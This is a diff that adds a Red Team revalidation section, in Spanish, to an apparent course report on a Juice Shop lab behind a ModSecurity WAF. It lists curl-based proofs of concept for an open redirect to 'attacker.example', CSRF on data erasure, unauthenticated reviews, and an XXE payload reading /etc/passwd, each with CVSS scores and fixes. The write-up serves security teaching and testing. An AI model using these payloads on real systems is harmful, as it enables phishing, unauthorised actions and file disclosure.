@@ -90,6 +90,121 @@ El WAF estaba en modo `On` al ejecutar estas pruebas. La PoC-04 fue actualizada 
 
 Las solicitudes se registraron en `access.log`. Se debe distinguir entre **una solicitud registrada** y **una alerta de auditoría de ModSecurity**: una petición permitida no equivale a una regla de detección activada. Las cuatro PoC necesitan correlación explícita (hora, ruta, payload, estado, identificador de auditoría si existe) en la demostración definitiva. Las pruebas son locales; no se atacaron sistemas de terceros.
 
+### 5.2 Revalidación del Red Team sobre la versión integrada (`20.4.0-SNAPSHOT`)
+
+El Red Team repitió las cuatro PoC sobre la **versión integrada del repositorio**, a través del mismo WAF (`http://localhost:8080`, ModSecurity + CRS en modo `On`). La versión se confirmó con `GET /rest/admin/application-version` → `{"version":"20.4.0-SNAPSHOT"}`. Las evidencias crudas (headers, body y código HTTP por PoC) están en `waf-siem/evidencias/poc_20261117_161550/`.
+
+Ninguna de las cuatro PoC es un payload de inyección (XSS/SQLi), por lo que el CRS las deja pasar; su mitigación corresponde a la capa de aplicación (Hito 4).
+
+| PoC | Vulnerabilidad | Endpoint | Código HTTP | Resultado | WAF | CVSS v3.1 (propuesto) |
+|---|---|---|---|---|---|---|
+| 01 | Open Redirect (CWE-601) | `GET /redirect` | 302 | Confirmada | Permitió | 6.1 (Media) |
+| 02 | CSRF (CWE-352) | `POST /dataerasure` | 200 | Confirmada a nivel app (ver caveat) | Permitió | 6.5 (Media) |
+| 03 | Falta de autorización en reseñas (CWE-862) | `PUT /rest/products/1/reviews` | 201 | Confirmada | Permitió | 5.3 (Media) |
+| 04 | XXE (CWE-611) | `POST /file-upload` | 410 | No demostrada | N/A | — |
+
+> Los valores CVSS son **propuestos** por el Red Team; ajústense según la rúbrica del curso.
+
+#### PoC 01 — Open Redirect
+
+- **Endpoint:** `GET /redirect?to=<url>`
+- **Descripción.** El endpoint valida la allowlist por *contenido/substring* en vez de por destino real. Incluyendo una URL permitida como parámetro de una URL atacante, la validación pasa y el usuario es redirigido a un dominio arbitrario.
+- **Reproducción.**
+
+```bash
+# Control: destino allowlisted (comportamiento legítimo) -> 302
+curl -i "http://localhost:8080/redirect?to=https://github.com/juice-shop/juice-shop"
+# Bypass: URL atacante con la allowlisted embebida como parámetro
+curl -i "http://localhost:8080/redirect?to=https://attacker.example/?x=https://github.com/juice-shop/juice-shop"
+```
+
+- **Resultado observado.** `HTTP/1.1 302` con `Location: https://attacker.example/?x=https://github.com/juice-shop/juice-shop`. La redirección apunta al dominio atacante, confirmando el open redirect. El WAF no bloqueó.
+- **Impacto.** Phishing / robo de credenciales: un enlace a un dominio confiable redirige a un sitio del atacante. Requiere interacción de la víctima (clic).
+- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` → **6.1 (Media)**. *Scope: Changed* porque el efecto cruza a un dominio distinto.
+- **Recomendación (H4).** Validar `to` contra allowlist por *igualdad exacta* de origen (esquema + host), no por substring.
+
+#### PoC 02 — CSRF en `/dataerasure`
+
+- **Endpoint:** `POST /dataerasure`
+- **Descripción.** La acción de borrado de datos se procesa basándose únicamente en la cookie de sesión `token`, sin exigir un token anti-CSRF impredecible. El navegador adjunta la cookie automáticamente.
+- **Reproducción.**
+
+```bash
+# 1) Crear usuario
+curl -X POST http://localhost:8080/api/Users -H 'Content-Type: application/json' \
+  -d '{"email":"csrf@test.op","password":"Passw0rd!","securityQuestion":{"id":1},"securityAnswer":"test"}'
+# 2) Login y copiar authentication.token
+curl -X POST http://localhost:8080/rest/user/login -H 'Content-Type: application/json' \
+  -d '{"email":"csrf@test.op","password":"Passw0rd!"}'
+# 3) POST sin token anti-CSRF, solo con la cookie de sesión
+curl -i -X POST http://localhost:8080/dataerasure \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: token=<TOKEN>' \
+  --data-urlencode 'email=csrf@test.op' --data-urlencode 'securityAnswer=test'
+```
+
+- **Resultado observado.** `HTTP/1.1 200`. La acción se procesa sin exigir token anti-CSRF. El WAF no bloqueó. (Coincide con lo observado por Blue Team en v20.3.0, incluida la respuesta que limpia la cookie.)
+- **Caveat — escenario cross-site pendiente de cierre.** El `curl` demuestra una sola mitad: que el endpoint **no exige token anti-CSRF**. La explotabilidad real desde otro sitio depende del atributo `SameSite` de la cookie `token`:
+  - `SameSite=Lax`/`Strict` → el navegador **no** envía la cookie en un POST cross-site; el ataque queda mitigado por el navegador, aunque la falla de diseño persiste.
+  - `SameSite=None` (o ausente, según el navegador) → el POST cross-site sí envía la cookie; explotable de extremo a extremo.
+  - **Pendiente:** confirmar `SameSite` de `token` (DevTools → Application → Cookies) y reproducir la página desde un **host distinto** (p. ej. `127.0.0.1` vs `localhost`), ya que dos puertos de `localhost` se consideran *same-site* y no prueban el escenario cross-site.
+- **Precondición.** El atacante debe conocer `email` y `securityAnswer` de la víctima. En Juice Shop las preguntas de seguridad son débiles y recuperables, lo que mantiene la viabilidad.
+- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` → **6.5 (Media)**. Si se confirma `SameSite=Lax`, considerar `AC:H` o reclasificar como hallazgo de diseño sin explotación directa.
+- **Recomendación (H4).** Token anti-CSRF por sesión/petición en acciones de estado + `SameSite=Strict`/`Lax` y `Secure` en la cookie de sesión.
+
+#### PoC 03 — Reseñas sin autenticación
+
+- **Endpoint:** `PUT /rest/products/1/reviews`
+- **Descripción.** El endpoint acepta la petición sin credenciales. Un usuario no autenticado puede publicar reseñas (incluyendo autoría arbitraria en `author`).
+- **Reproducción.**
+
+```bash
+curl -i -X PUT http://localhost:8080/rest/products/1/reviews \
+  -H 'Content-Type: application/json' \
+  -d '{"message":"PoC sin autenticacion","author":"anon@poc"}'
+```
+
+- **Resultado observado.** `HTTP/1.1 201`. La reseña se crea sin cabecera `Authorization` ni sesión. El WAF no bloqueó. (Blue Team observó lo mismo en v20.3.0 sobre el producto 24; aquí sobre el producto 1.)
+- **Impacto.** Inyección de contenido y suplantación de autoría (spam, reseñas falsas, abuso de reputación).
+- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` → **5.3 (Media)**.
+- **Recomendación (H4).** Exigir autenticación y derivar `author` del usuario autenticado del token, no del cuerpo de la petición.
+
+#### PoC 04 — XXE (no demostrada en esta versión)
+
+- **Endpoint:** `POST /file-upload`
+- **Descripción.** Se intentó el vector clásico de XXE subiendo un XML con una entidad externa que referencia un archivo local del servidor.
+- **Reproducción.**
+
+```bash
+cat > xxe.xml <<'XML'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+XML
+curl -i -X POST http://localhost:8080/file-upload -F "file=@xxe.xml"
+```
+
+- **Resultado observado.** `HTTP/1.1 410 Gone` generado por la aplicación. No se obtuvo contenido del archivo ni evidencia de procesamiento de la entidad externa. (Coincide con v20.3.0.)
+- **Interpretación.** El `410` sugiere que el endpoint/flujo de parseo XML fue deshabilitado o retirado. **XXE no confirmada** en `20.4.0-SNAPSHOT`.
+- **Decisión recomendada.** Documentar como **no explotable en la versión integrada** (con la evidencia del 410), o sustituir por otra vulnerabilidad real presente en esta versión. No reportarla como confirmada.
+
+### 5.3 Consistencia entre versiones
+
+Los resultados coinciden en ambas versiones, lo que respalda que los hallazgos no dependen de la imagen de laboratorio y aplican a la versión integrada del equipo:
+
+| PoC | `v20.3.0` (Blue, WAF) | `20.4.0-SNAPSHOT` (Red, WAF) | Consistencia |
+|---|---|---|---|
+| 01 — Open Redirect | 302, no bloqueó | 302, no bloqueó | ✔ igual |
+| 02 — CSRF `/dataerasure` | 200, no bloqueó | 200, no bloqueó | ✔ igual |
+| 03 — Reseñas sin auth | 201, no bloqueó | 201, no bloqueó | ✔ igual |
+| 04 — XXE | 410, no confirmada | 410, no confirmada | ✔ igual |
+
+**Correlación con SIEM (pendiente).** Las cuatro PoC de la revalidación (5.2) necesitan su correlación explícita en Kibana (hora, ruta, payload, estado, identificador de auditoría si existe). La corrida quedó registrada bajo el timestamp `20261117_161550` (local, UTC-6). Consulta de referencia en Discover:
+
+```
+url.path: ("/redirect" or "/dataerasure" or "/rest/products/1/reviews" or "/file-upload")
+```
+
 ## 6. Análisis de falsos positivos y ajustes
 
 Se revisó `waf-siem/waf/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf`. Este archivo **ya contenía** la regla local `10001`, limitada al encabezado `Host` con IP `127.0.0.1`, que excluye **solo ese objetivo** de la evaluación de la regla CRS `920350` (encabezado `Host` con dirección IP numérica). No se desactivó el conjunto de reglas de OWASP CRS.
